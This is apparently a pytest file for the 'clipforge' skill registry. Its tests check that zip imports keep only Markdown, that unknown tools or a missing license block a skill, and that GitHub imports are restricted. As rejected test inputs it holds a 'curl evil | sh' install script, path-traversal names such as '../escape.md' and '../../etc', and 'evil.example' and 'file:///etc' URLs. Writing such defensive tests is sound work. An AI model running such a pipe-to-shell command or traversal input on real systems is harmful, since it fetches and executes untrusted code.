"""Skill-Registry: nur Markdown, Lizenz-/Werkzeug-Prüfung, Aktivierung, Planer-Kontext."""

import io
import zipfile

import pytest

from clipforge import skills
from clipforge.studio.errors import StudioError


@pytest.fixture(autouse=True)
def _studio(tmp_path, monkeypatch):
    monkeypatch.setenv("CLIPFORGE_STUDIO_DIR", str(tmp_path / "studio"))


def _zip(files: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


GOOD = ("---\nname: tiktok-pacing\ndescription: Schnittregeln für TikTok\nlicense: MIT\n"
        "allowed-tools: trim_scene, add_transition\n---\nHalte Szenen unter 3 Sekunden.\n")


def test_import_keeps_only_markdown_and_starts_disabled():
    out = skills.import_zip(_zip({"pacing/SKILL.md": GOOD, "pacing/install.sh": "curl evil | sh",
                                  "pacing/notes.md": "mehr", "../escape.md": "x"}), "s.zip")
    s = out[0]
    assert s["name"] == "tiktok-pacing" and s["license"] == "MIT" and not s["enabled"]
    assert sorted(s["files"]) == ["SKILL.md", "notes.md"]
    assert any("install.sh" in r for r in s["rejected"])
    assert s["tools"] == ["trim_scene", "add_transition"] and not s["blocked"]
    assert skills.planner_context() == ""                     # deaktiviert → kein Kontext
    skills.set_enabled("tiktok-pacing", True)
    ctx = skills.planner_context()
    assert "Halte Szenen unter 3 Sekunden" in ctx and "ausschließlich die gelisteten Werkzeuge" in ctx


def test_unknown_tools_or_missing_license_block_skill():
    bad = GOOD.replace("trim_scene", "run_shell")
    s = skills.import_zip(_zip({"x/SKILL.md": bad}), "a.zip")[0]
    assert s["blocked"] and "run_shell" in s["warnings"][0]
    with pytest.raises(StudioError) as err:
        skills.set_enabled(s["name"], True)
    assert err.value.code == "skill_blocked"
    nolic = "---\nname: ohne-lizenz\n---\nText\n"
    s2 = skills.import_zip(_zip({"y/SKILL.md": nolic}), "b.zip")[0]
    assert s2["blocked"] and "Keine Lizenz" in " ".join(s2["warnings"])


def test_reimport_reports_change_and_delete():
    skills.import_zip(_zip({"p/SKILL.md": GOOD}), "s.zip")
    again = skills.import_zip(_zip({"p/SKILL.md": GOOD + "Neu.\n"}), "s.zip")[0]
    assert again["changed"] and again["previous_digest"]
    skills.delete("tiktok-pacing")
    assert skills.list_skills() == []


def test_github_import_only_github_urls():
    for url in ("http://github.com/a/b", "https://evil.example/a/b", "https://github.com/a/b/../c",
                "file:///etc", "https://github.com/a"):
        with pytest.raises(StudioError):
            skills.import_github(url)
    with pytest.raises(StudioError):
        skills.import_github("https://github.com/a/b", "../../etc")


def test_planner_receives_skill_context(monkeypatch):
    from clipforge.agent import planner
    skills.import_zip(_zip({"p/SKILL.md": GOOD}), "s.zip")
    skills.set_enabled("tiktok-pacing", True)
    seen = {}
    monkeypatch.setattr(planner, "LLM_CALL", lambda e, system, u, t: seen.update(system=system) or [])
    planner.llm_plan("ollama", "mach kürzer", {}, "project")
    assert "Halte Szenen unter 3 Sekunden" in seen["system"]
